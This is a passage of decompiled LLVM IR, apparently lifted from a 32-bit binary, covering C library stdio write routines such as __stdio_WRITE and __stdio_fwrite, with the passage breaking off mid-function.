  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 3, 0, 2, 7, 4, 5, 8, 1, 6 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80553d1, { 1, 0 }
  uselistorder label %dec_label_pc_80553cd, { 1, 0 }
  uselistorder label %dec_label_pc_80553ab, { 1, 0 }
  uselistorder label %dec_label_pc_805539d, { 1, 0 }
  uselistorder label %dec_label_pc_805539b, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80553dd = load i32, i32* @edi, align 4
  %v0_80553df = load i32, i32* @ebx, align 4
  %v15_80553e0 = ptrtoint i32* %stack_var_-28 to i32
  %v4_80553e3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80553e3, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80553ef4 = icmp eq i32 %arg3, 0
  store i1 %v1_80553ef4, i1* %zf.global-to-local, align 1
  br i1 %v1_80553ef4, label %dec_label_pc_8055450, label %dec_label_pc_80553f4.lr.ph

dec_label_pc_80553f4.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80553f4

dec_label_pc_80553f4:                             ; preds = %dec_label_pc_8055410.dec_label_pc_80553f4_crit_edge, %dec_label_pc_80553f4.lr.ph
  %v0_8055401 = phi i32 [ %v4_80553e3, %dec_label_pc_80553f4.lr.ph ], [ %v0_8055401.pre, %dec_label_pc_8055410.dec_label_pc_80553f4_crit_edge ]
  %v0_8055400 = phi i32 [ %arg2, %dec_label_pc_80553f4.lr.ph ], [ %v2_8055412, %dec_label_pc_8055410.dec_label_pc_80553f4_crit_edge ]
  %v0_80553fc.in = phi i32 [ %arg3, %dec_label_pc_80553f4.lr.ph ], [ %v2_8055410, %dec_label_pc_8055410.dec_label_pc_80553f4_crit_edge ]
  %v4_80553fc = phi i32 [ %arg3, %dec_label_pc_80553f4.lr.ph ], [ %v2_8055410, %dec_label_pc_8055410.dec_label_pc_80553f4_crit_edge ]
  %v0_80553fc = icmp slt i32 %v0_80553fc.in, 0
  store i32 %v4_80553fc, i32* %esi.global-to-local, align 4
  %v2_80553fc = icmp eq i1 %v0_80553fc, false
  %v5_80553fc = select i1 %v2_80553fc, i32 %v4_80553fc, i32 2147483647
  store i32 %v5_80553fc, i32* %eax.global-to-local, align 4
  %v1_8055401 = add i32 %v0_8055401, 4
  %v2_8055401 = inttoptr i32 %v1_8055401 to i32*
  %v3_8055401 = load i32, i32* %v2_8055401, align 4
  %tmp36 = inttoptr i32 %v0_8055400 to i32*
  %v5_8055404 = call i32 @__libc_write(i32 %v3_8055401, i32* %tmp36, i32 %v5_80553fc)
  store i32 %v5_8055404, i32* %eax.global-to-local, align 4
  %v1_805540c = icmp eq i32 %v5_8055404, 0
  store i1 %v1_805540c, i1* %zf.global-to-local, align 1
  %v2_805540c = icmp slt i32 %v5_8055404, 0
  br i1 %v2_805540c, label %dec_label_pc_8055416, label %dec_label_pc_8055410

dec_label_pc_8055410:                             ; preds = %dec_label_pc_80553f4
  %v0_8055410 = load i32, i32* @ebx, align 4
  %v2_8055410 = sub i32 %v0_8055410, %v5_8055404
  %v12_8055410 = icmp eq i32 %v2_8055410, 0
  store i32 %v2_8055410, i32* @ebx, align 4
  %v0_8055412 = load i32, i32* @edi, align 4
  %v2_8055412 = add i32 %v0_8055412, %v5_8055404
  store i32 %v2_8055412, i32* @edi, align 4
  store i1 %v12_8055410, i1* %zf.global-to-local, align 1
  br i1 %v12_8055410, label %dec_label_pc_8055450, label %dec_label_pc_8055410.dec_label_pc_80553f4_crit_edge

dec_label_pc_8055410.dec_label_pc_80553f4_crit_edge: ; preds = %dec_label_pc_8055410
  %v0_8055401.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80553f4

dec_label_pc_8055416:                             ; preds = %dec_label_pc_80553f4
  %v0_8055416 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055416 = inttoptr i32 %v0_8055416 to i32*
  %v2_8055416 = load i32, i32* %v1_8055416, align 4
  store i32 %v2_8055416, i32* %eax.global-to-local, align 4
  %v1_8055419 = add i32 %v0_8055416, 8
  %v2_8055419 = inttoptr i32 %v1_8055419 to i32*
  %v3_8055419 = load i32, i32* %v2_8055419, align 4
  store i32 %v3_8055419, i32* @edx, align 4
  %v1_805541c = or i32 %v2_8055416, 8
  store i32 %v1_805541c, i32* %eax.global-to-local, align 4
  %v1_805541f = trunc i32 %v1_805541c to i16
  %v3_805541f = inttoptr i32 %v0_8055416 to i16*
  store i16 %v1_805541f, i16* %v3_805541f, align 2
  %v0_8055423 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055423 = add i32 %v0_8055423, 12
  %v2_8055423 = inttoptr i32 %v1_8055423 to i32*
  %v3_8055423 = load i32, i32* %v2_8055423, align 4
  %v1_8055426 = load i32, i32* @edx, align 4
  %v2_8055426 = sub i32 %v3_8055423, %v1_8055426
  %v12_8055426 = icmp eq i32 %v2_8055426, 0
  store i1 %v12_8055426, i1* %zf.global-to-local, align 1
  store i32 %v2_8055426, i32* %eax.global-to-local, align 4
  %v4_805544c.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8055426, label %dec_label_pc_805544c, label %dec_label_pc_805542a

dec_label_pc_805542a:                             ; preds = %dec_label_pc_8055416
  %v12_805542a = icmp eq i32 %v2_8055426, %v4_805544c.pre
  store i1 %v12_805542a, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8055426, %v4_805544c.pre
  %v3_805542c = load i32, i32* %esi.global-to-local, align 4
  %v5_805542c = select i1 %tmp, i32 %v2_8055426, i32 %v3_805542c
  store i32 %v5_805542c, i32* %esi.global-to-local, align 4
  %v0_805542f.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805542f

dec_label_pc_805542f:                             ; preds = %dec_label_pc_8055441, %dec_label_pc_805542a
  %v2_8055433 = phi i32 [ %v1_805543d, %dec_label_pc_8055441 ], [ %v1_8055426, %dec_label_pc_805542a ]
  %v4_805542f = phi i32 [ %v4_805542f.pre, %dec_label_pc_8055441 ], [ %v2_8055426, %dec_label_pc_805542a ]
  %v0_805542f = phi i32 [ %v1_8055441, %dec_label_pc_8055441 ], [ %v0_805542f.pre, %dec_label_pc_805542a ]
  %v1_805542f = inttoptr i32 %v0_805542f to i8*
  %v2_805542f = load i8, i8* %v1_805542f, align 1
  %v3_805542f = zext i8 %v2_805542f to i32
  %v5_805542f = and i32 %v4_805542f, -256
  %v6_805542f = or i32 %v3_805542f, %v5_805542f
  store i32 %v6_805542f, i32* %eax.global-to-local, align 4
  %v10_8055431 = icmp eq i8 %v2_805542f, 10
  store i1 %v10_8055431, i1* %zf.global-to-local, align 1
  %v3_8055433 = inttoptr i32 %v2_8055433 to i8*
  store i8 %v2_805542f, i8* %v3_8055433, align 1
  %v0_8055435 = load i1, i1* %zf.global-to-local, align 1
  %v1_8055435 = icmp eq i1 %v0_8055435, false
  br i1 %v1_8055435, label %dec_label_pc_805543d, label %dec_label_pc_8055437

dec_label_pc_8055437:                             ; preds = %dec_label_pc_805542f
  %v0_8055437 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055437 = add i32 %v0_8055437, 1
  %v2_8055437 = inttoptr i32 %v1_8055437 to i8*
  %v3_8055437 = load i8, i8* %v2_8055437, align 1
  %v4_8055437 = urem i8 %v3_8055437, 2
  %v5_8055437 = icmp eq i8 %v4_8055437, 0
  store i1 %v5_8055437, i1* %zf.global-to-local, align 1
  %v1_805543b = icmp eq i1 %v5_8055437, false
  br i1 %v1_805543b, label %dec_label_pc_8055437.dec_label_pc_8055444_crit_edge, label %dec_label_pc_805543d

dec_label_pc_8055437.dec_label_pc_8055444_crit_edge: ; preds = %dec_label_pc_8055437
  %v0_8055444.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055444

dec_label_pc_805543d:                             ; preds = %dec_label_pc_8055437, %dec_label_pc_805542f
  %v0_805543d = load i32, i32* @edx, align 4
  %v1_805543d = add i32 %v0_805543d, 1
  store i32 %v1_805543d, i32* @edx, align 4
  %v0_805543e = load i32, i32* %esi.global-to-local, align 4
  %v1_805543e = add i32 %v0_805543e, -1
  %v8_805543e = icmp eq i32 %v1_805543e, 0
  store i1 %v8_805543e, i1* %zf.global-to-local, align 1
  store i32 %v1_805543e, i32* %esi.global-to-local, align 4
  br i1 %v8_805543e, label %dec_label_pc_805543d.dec_label_pc_8055444_crit_edge, label %dec_label_pc_8055441

dec_label_pc_805543d.dec_label_pc_8055444_crit_edge: ; preds = %dec_label_pc_805543d
  %v1_8055444.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055444

dec_label_pc_8055441:                             ; preds = %dec_label_pc_805543d
  %v0_8055441 = load i32, i32* @edi, align 4
  %v1_8055441 = add i32 %v0_8055441, 1
  %v8_8055441 = icmp eq i32 %v1_8055441, 0
  store i1 %v8_8055441, i1* %zf.global-to-local, align 1
  store i32 %v1_8055441, i32* @edi, align 4
  %v4_805542f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805542f

dec_label_pc_8055444:                             ; preds = %dec_label_pc_805543d.dec_label_pc_8055444_crit_edge, %dec_label_pc_8055437.dec_label_pc_8055444_crit_edge
  %v1_8055444 = phi i32 [ %v0_8055437, %dec_label_pc_8055437.dec_label_pc_8055444_crit_edge ], [ %v1_8055444.pre, %dec_label_pc_805543d.dec_label_pc_8055444_crit_edge ]
  %v0_8055444 = phi i32 [ %v0_8055444.pre, %dec_label_pc_8055437.dec_label_pc_8055444_crit_edge ], [ %v1_805543d, %dec_label_pc_805543d.dec_label_pc_8055444_crit_edge ]
  %v2_8055444 = add i32 %v1_8055444, 16
  %v3_8055444 = inttoptr i32 %v2_8055444 to i32*
  store i32 %v0_8055444, i32* %v3_8055444, align 4
  %v0_8055447 = load i32, i32* @edx, align 4
  %v1_8055447 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055447 = add i32 %v1_8055447, 8
  %v3_8055447 = inttoptr i32 %v2_8055447 to i32*
  %v4_8055447 = load i32, i32* %v3_8055447, align 4
  %v5_8055447 = sub i32 %v0_8055447, %v4_8055447
  store i32 %v5_8055447, i32* @edx, align 4
  %v0_805544a = load i32, i32* @ebx, align 4
  %v2_805544a = sub i32 %v0_805544a, %v5_8055447
  %v12_805544a = icmp eq i32 %v2_805544a, 0
  store i1 %v12_805544a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805544c

dec_label_pc_805544c:                             ; preds = %dec_label_pc_8055416, %dec_label_pc_8055444
  %v4_805544c = phi i32 [ %v2_805544a, %dec_label_pc_8055444 ], [ %v4_805544c.pre, %dec_label_pc_8055416 ]
  %v5_805544c = sub i32 %arg3, %v4_805544c
  %v15_805544c = icmp eq i32 %v5_805544c, 0
  store i1 %v15_805544c, i1* %zf.global-to-local, align 1
  %v0_8055454.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055450

dec_label_pc_8055450:                             ; preds = %dec_label_pc_8055410, %entry, %dec_label_pc_805544c
  %v0_8055454 = phi i32 [ %v0_8055454.pre, %dec_label_pc_805544c ], [ %v15_80553e0, %entry ], [ %v15_80553e0, %dec_label_pc_8055410 ]
  %stack_var_12.0 = phi i32 [ %v5_805544c, %dec_label_pc_805544c ], [ 0, %entry ], [ %arg3, %dec_label_pc_8055410 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8055454 = icmp eq i32 %v0_8055454, -12
  store i1 %v9_8055454, i1* %zf.global-to-local, align 1
  store i32 %v0_80553df, i32* @ebx, align 4
  store i32 %v0_80553dd, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8055441, { 1, 2, 0 }
  uselistorder i32 %v1_805543e, { 1, 0 }
  uselistorder i32 %v1_805543d, { 0, 2, 1 }
  uselistorder i8 %v2_805542f, { 1, 0, 2 }
  uselistorder i32 %v4_805544c.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8055426, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8055412, { 1, 0 }
  uselistorder i32 %v2_8055410, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8055404, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8055450, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805544c, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805545c = load i32, i32* @ebp, align 4
  %v0_805545d = load i32, i32* @edi, align 4
  %v0_805545e = load i32, i32* @esi, align 4
  %v0_805545f = load i32, i32* @ebx, align 4
  store i32 %v0_805545f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805546f = add i32 %arg3, 1
  %v2_805546f = inttoptr i32 %v1_805546f to i8*
  %v3_805546f = load i8, i8* %v2_805546f, align 1
  %v4_805546f = and i8 %v3_805546f, 2
  %v5_805546f = icmp eq i8 %v4_805546f, 0
  %v1_8055473 = icmp eq i1 %v5_805546f, false
  br i1 %v1_8055473, label %dec_label_pc_8055524, label %dec_label_pc_8055479

dec_label_pc_8055479:                             ; preds = %entry
  %v1_8055479 = add i32 %arg3, 4
  %v2_8055479 = inttoptr i32 %v1_8055479 to i32*
  %v3_8055479 = load i32, i32* %v2_8055479, align 4
  %v13_8055479 = icmp eq i32 %v3_8055479, -2
  %v1_805547d = add i32 %arg3, 16
  %v2_805547d = inttoptr i32 %v1_805547d to i32*
  %v3_805547d = load i32, i32* %v2_805547d, align 4
  store i32 %v3_805547d, i32* @edx, align 4
  %v1_8055480 = add i32 %arg3, 12
  %v2_8055480 = inttoptr i32 %v1_8055480 to i32*
  %v3_8055480 = load i32, i32* %v2_8055480, align 4
  store i32 %v3_8055480, i32* %eax.global-to-local, align 4
  %v1_8055483 = icmp eq i1 %v13_8055479, false
  %v2_80554a2 = sub i32 %v3_8055480, %v3_805547d
  br i1 %v1_8055483, label %dec_label_pc_80554a2, label %dec_label_pc_8055485

dec_label_pc_8055485:                             ; preds = %dec_label_pc_8055479
  %tmp = icmp uge i32 %v2_80554a2, %arg2
  %v5_805548c = select i1 %tmp, i32 %arg2, i32 %v2_80554a2
  store i32 %v5_805548c, i32* %ebx.global-to-local, align 4
  %v3_8055492 = inttoptr i32 %v3_805547d to i16*
  %v4_8055492 = call i32 @memcpy(i16* %v3_8055492, i32 %v5_805548c, i32 %v3_8055480)
  store i32 %v4_8055492, i32* %eax.global-to-local, align 4
  %v0_805549a = load i32, i32* @esi, align 4
  %v1_805549a = add i32 %v0_805549a, 16
  %v2_805549a = inttoptr i32 %v1_805549a to i32*
  %v3_805549a = load i32, i32* %v2_805549a, align 4
  %v4_805549a = load i32, i32* %ebx.global-to-local, align 4
  %v5_805549a = add i32 %v4_805549a, %v3_805549a
  store i32 %v5_805549a, i32* %v2_805549a, align 4
  br label %dec_label_pc_805553c

dec_label_pc_80554a2:                             ; preds = %dec_label_pc_8055479
  store i32 %v2_80554a2, i32* %eax.global-to-local, align 4
  %v6_80554a6 = icmp ult i32 %v2_80554a2, %arg2
  br i1 %v6_80554a6, label %dec_label_pc_805550b, label %dec_label_pc_80554a8

dec_label_pc_80554a8:                             ; preds = %dec_label_pc_80554a2
  %v0_80554a8 = load i32, i32* @ecx, align 4
  %v3_80554ac = inttoptr i32 %v3_805547d to i16*
  %v4_80554ac = call i32 @memcpy(i16* %v3_80554ac, i32 %arg2, i32 %v0_80554a8)
  store i32 %v4_80554ac, i32* %eax.global-to-local, align 4
  %v0_80554b4 = load i32, i32* @esi, align 4
  %v1_80554b4 = add i32 %v0_80554b4, 16
  %v2_80554b4 = inttoptr i32 %v1_80554b4 to i32*
  %v3_80554b4 = load i32, i32* %v2_80554b4, align 4
  %v4_80554b4 = load i32, i32* @edi, align 4
  %v5_80554b4 = add i32 %v4_80554b4, %v3_80554b4
  store i32 %v5_80554b4, i32* %v2_80554b4, align 4
  %v0_80554b7 = load i32, i32* @esi, align 4
  %v1_80554b7 = add i32 %v0_80554b7, 1
  %v2_80554b7 = inttoptr i32 %v1_80554b7 to i8*
  %v3_80554b7 = load i8, i8* %v2_80554b7, align 1
  %v4_80554b7 = urem i8 %v3_80554b7, 2
  %v5_80554b7 = icmp eq i8 %v4_80554b7, 0
  br i1 %v5_80554b7, label %dec_label_pc_805553c, label %dec_label_pc_80554bd

dec_label_pc_80554bd:                             ; preds = %dec_label_pc_80554a8
  %v0_80554bd = load i32, i32* @edx, align 4
  %v0_80554be = load i32, i32* @edi, align 4
  %v4_80554c2 = call i32 @memrchr(i8 10, i32 %v0_80554be, i32 %v0_80554bd)
  store i32 %v4_80554c2, i32* %eax.global-to-local, align 4
  %v1_80554ca = icmp eq i32 %v4_80554c2, 0
  br i1 %v1_80554ca, label %dec_label_pc_805553c, label %dec_label_pc_80554ce

dec_label_pc_80554ce:                             ; preds = %dec_label_pc_80554bd
  %v0_80554d1 = load i32, i32* @esi, align 4
  %v1_80554d2 = call i32 @__stdio_wcommit(i32 %v0_80554d1)
  store i32 %v1_80554d2, i32* %eax.global-to-local, align 4
  %v1_80554da = icmp eq i32 %v1_80554d2, 0
  br i1 %v1_80554da, label %dec_label_pc_805553c, label %dec_label_pc_80554de

dec_label_pc_80554de:                             ; preds = %dec_label_pc_80554ce
  %v0_80554de = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_80554de, %v1_80554d2
  %v5_80554e2 = select i1 %tmp20, i32 %v0_80554de, i32 %v1_80554d2
  store i32 %v5_80554e2, i32* %ebx.global-to-local, align 4
  %v2_80554e7 = sub i32 %v0_80554de, %v5_80554e2
  store i32 %v2_80554e7, i32* %eax.global-to-local, align 4
  %v0_80554e9 = load i32, i32* @ebp, align 4
  %v2_80554e9 = add i32 %v0_80554e9, %v2_80554e7
  store i32 %v2_80554e9, i32* %ebp.global-to-local, align 4
  %v4_80554f0 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_80554e2, i32 %v2_80554e7)
  store i32 %v4_80554f0, i32* %eax.global-to-local, align 4
  %v1_80554f8 = icmp eq i32 %v4_80554f0, 0
  store i32 %v4_80554f0, i32* @edx, align 4
  br i1 %v1_80554f8, label %dec_label_pc_805553c, label %dec_label_pc_80554fe

dec_label_pc_80554fe:                             ; preds = %dec_label_pc_80554de
  %v0_80554fe = load i32, i32* %ebp.global-to-local, align 4
  %v1_80554fe = load i32, i32* %ebx.global-to-local, align 4
  %v2_80554fe = sub i32 %v0_80554fe, %v4_80554f0
  %v2_8055502 = add i32 %v2_80554fe, %v1_80554fe
  store i32 %v2_8055502, i32* %eax.global-to-local, align 4
  %v0_8055504 = load i32, i32* @esi, align 4
  %v1_8055504 = add i32 %v0_8055504, 16
  %v2_8055504 = inttoptr i32 %v1_8055504 to i32*
  %v3_8055504 = load i32, i32* %v2_8055504, align 4
  %v5_8055504 = sub i32 %v3_8055504, %v2_8055502
  store i32 %v5_8055504, i32* %v2_8055504, align 4
  %v0_8055507 = load i32, i32* @edi, align 4
  %v1_8055507 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055507 = sub i32 %v0_8055507, %v1_8055507
  store i32 %v2_8055507, i32* @edi, align 4
  br label %dec_label_pc_805553c

dec_label_pc_805550b:                             ; preds = %dec_label_pc_80554a2
  %v2_805550b = add i32 %arg3, 8
  %v3_805550b = inttoptr i32 %v2_805550b to i32*
  %v4_805550b = load i32, i32* %v3_805550b, align 4
  %v15_805550b = icmp eq i32 %v3_805547d, %v4_805550b
  br i1 %v15_805550b, label %dec_label_pc_8055524, label %dec_label_pc_8055510

dec_label_pc_8055510:                             ; preds = %dec_label_pc_805550b
  %v1_8055514 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8055514, i32* %eax.global-to-local, align 4
  %v1_805551c = icmp eq i32 %v1_8055514, 0
  br i1 %v1_805551c, label %dec_label_pc_8055510.dec_label_pc_8055524_crit_edge, label %dec_label_pc_8055520

dec_label_pc_8055510.dec_label_pc_8055524_crit_edge: ; preds = %dec_label_pc_8055510
  %v0_8055524.pre = load i32, i32* @edi, align 4
  %v0_805552c.pre = load i32, i32* @esi, align 4
  %v2_8055533.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055524

dec_label_pc_8055520:                             ; preds = %dec_label_pc_8055510
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805553c

dec_label_pc_8055524:                             ; preds = %dec_label_pc_8055510.dec_label_pc_8055524_crit_edge, %dec_label_pc_805550b, %entry
  %v2_8055533 = phi i32 [ %v2_8055533.pre, %dec_label_pc_8055510.dec_label_pc_8055524_crit_edge ], [ %v0_805545f, %dec_label_pc_805550b ], [ %v0_805545f, %entry ]
  %v0_805552c = phi i32 [ %v0_805552c.pre, %dec_label_pc_8055510.dec_label_pc_8055524_crit_edge ], [ %arg3, %dec_label_pc_805550b ], [ %arg3, %entry ]
  %v0_8055524 = phi i32 [ %v0_8055524.pre, %dec_label_pc_8055510.dec_label_pc_8055524_crit_edge ], [ %arg2, %dec_label_pc_805550b ], [ %arg2, %entry ]
  store i32 %v2_8055533, i32* @ebx, align 4
  store i32 %v0_805545d, i32* @edi, align 4
  %v4_8055537 = inttoptr i32 %v0_805552c to i16*
  %v5_8055537 = call i32 @__stdio_WRITE(i16* %v4_8055537, i32 %v0_8055524, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055537, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805553c

dec_label_pc_805553c:                             ; preds = %dec_label_pc_80554de, %dec_label_pc_80554ce, %dec_label_pc_80554bd, %dec_label_pc_80554a8, %dec_label_pc_8055520, %dec_label_pc_80554fe, %dec_label_pc_8055485, %dec_label_pc_8055524
  %v0_805553f = load i32, i32* @edi, align 4
  store i32 %v0_805553f, i32* %eax.global-to-local, align 4
  %v2_8055541 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055541, i32* @ebx, align 4
  store i32 %v0_805545e, i32* @esi, align 4
  store i32 %v0_805545d, i32* @edi, align 4
  store i32 %v0_805545c, i32* @ebp, align 4
  ret i32 %v0_805553f

; uselistorder directives
  uselistorder i32 %v2_8055502, { 1, 0 }
  uselistorder i32 %v0_80554de, { 2, 1, 0 }
  uselistorder i32 %v1_80554d2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80554a2, { 2, 3, 1, 0 }
  uselistorder i32 %v3_805547d, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_805545d, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_805553c, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055548 = load i32, i32* @ebx, align 4
  %v4_805554c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805554c, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8055554 = load i16, i16* %arg1, align 2
  %v3_8055554 = zext i16 %v2_8055554 to i32
  store i32 %v3_8055554, i32* %eax.global-to-local, align 4
  %v2_8055557 = and i32 %v3_8055554, %arg2
  %v3_8055557 = icmp eq i32 %v2_8055557, 0
  %v1_8055559 = icmp eq i1 %v3_8055557, false
  br i1 %v1_8055559, label %dec_label_pc_8055567, label %dec_label_pc_805555b

dec_label_pc_805555b:                             ; preds = %entry
  %v1_805555b = and i32 %v3_8055554, 2176
  %v2_805555b = icmp eq i32 %v1_805555b, 0
  %v1_8055560 = icmp eq i1 %v2_805555b, false
  br i1 %v1_8055560, label %dec_label_pc_805556f, label %dec_label_pc_8055562

dec_label_pc_8055562:                             ; preds = %dec_label_pc_805555b
  %v2_8055562 = or i32 %v3_8055554, %arg2
  store i32 %v2_8055562, i32* %eax.global-to-local, align 4
  %v1_8055564 = trunc i32 %v2_8055562 to i16
  store i16 %v1_8055564, i16* %arg1, align 2
  %v0_8055567.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055567

dec_label_pc_8055567:                             ; preds = %entry, %dec_label_pc_8055562
  %v0_80555b0 = phi i32 [ %v4_805554c, %entry ], [ %v0_8055567.pre, %dec_label_pc_8055562 ]
  %v1_8055567 = inttoptr i32 %v0_80555b0 to i16*
  %v2_8055567 = load i16, i16* %v1_8055567, align 2
  %v3_8055567 = zext i16 %v2_8055567 to i32
  store i32 %v3_8055567, i32* %edx.global-to-local, align 4
  %v2_805556a = and i16 %v2_8055567, 32
  %v3_805556a = icmp eq i16 %v2_805556a, 0
  br i1 %v3_805556a, label %dec_label_pc_8055587, label %dec_label_pc_805556f

dec_label_pc_805556f:                             ; preds = %dec_label_pc_8055567, %dec_label_pc_805555b
  %v1_805556f = call i32 @__errno_location(i32 %v0_8055548)
  store i32 %v1_805556f, i32* %eax.global-to-local, align 4
  %v1_8055574 = inttoptr i32 %v1_805556f to i32*
  store i32 9, i32* %v1_8055574, align 4
  br label %dec_label_pc_805557a

dec_label_pc_805557a:                             ; preds = %dec_label_pc_805559e, %dec_label_pc_805556f
  %v0_805557a = load i32, i32* @ebx, align 4
  %v1_805557a = inttoptr i32 %v0_805557a to i32*
  %v2_805557a = load i32, i32* %v1_805557a, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_805557f = or i32 %v2_805557a, 8
  store i32 %v1_805557f, i32* %eax.global-to-local, align 4
  %v1_8055582 = trunc i32 %v1_805557f to i16
  %v3_8055582 = inttoptr i32 %v0_805557a to i16*
  store i16 %v1_8055582, i16* %v3_8055582, align 2
  br label %dec_label_pc_80555e9

dec_label_pc_8055587:                             ; preds = %dec_label_pc_8055567
  %v2_8055587 = urem i16 %v2_8055567, 4
  %v3_8055587 = icmp eq i16 %v2_8055587, 0
  br i1 %v3_8055587, label %dec_label_pc_80555d1, label %dec_label_pc_805558c

dec_label_pc_805558c:                             ; preds = %dec_label_pc_8055587
  %v2_805558c = and i32 %v3_8055567, 4
  %v3_805558c = icmp eq i32 %v2_805558c, 0
  %v1_805558f = icmp eq i1 %v3_805558c, false
  br i1 %v1_805558f, label %dec_label_pc_80555bd, label %dec_label_pc_8055591

dec_label_pc_8055591:                             ; preds = %dec_label_pc_805558c
  %v1_8055591 = add i32 %v0_80555b0, 20
  %v2_8055591 = inttoptr i32 %v1_8055591 to i32*
  %v3_8055591 = load i32, i32* %v2_8055591, align 4
  store i32 %v3_8055591, i32* %eax.global-to-local, align 4
  %v2_8055594 = add i32 %v0_80555b0, 16
  %v3_8055594 = inttoptr i32 %v2_8055594 to i32*
  %v4_8055594 = load i32, i32* %v3_8055594, align 4
  %v15_8055594 = icmp eq i32 %v3_8055591, %v4_8055594
  %v1_8055597 = icmp eq i1 %v15_8055594, false
  br i1 %v1_8055597, label %dec_label_pc_805559e, label %dec_label_pc_8055599

dec_label_pc_8055599:                             ; preds = %dec_label_pc_8055591
  %v2_8055599 = and i32 %v3_8055567, 2
  %v3_8055599 = icmp eq i32 %v2_8055599, 0
  br i1 %v3_8055599, label %dec_label_pc_80555bd, label %dec_label_pc_805559e

dec_label_pc_805559e:                             ; preds = %dec_label_pc_8055599, %dec_label_pc_8055591
  %v1_805559e = and i32 %v3_8055567, 1024
  store i32 %v1_805559e, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_805559e, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_80555b1 = call i32 @__GI_fseek(i32 %v0_80555b0, i32 0, i32 %tmp17, i32 %v1_805559e)
  store i32 %v5_80555b1, i32* %eax.global-to-local, align 4
  %v1_80555b9 = icmp eq i32 %v5_80555b1, 0
  %v1_80555bb = icmp eq i1 %v1_80555b9, false
  br i1 %v1_80555bb, label %dec_label_pc_805557a, label %dec_label_pc_805559e.dec_label_pc_80555bd_crit_edge

dec_label_pc_805559e.dec_label_pc_80555bd_crit_edge: ; preds = %dec_label_pc_805559e
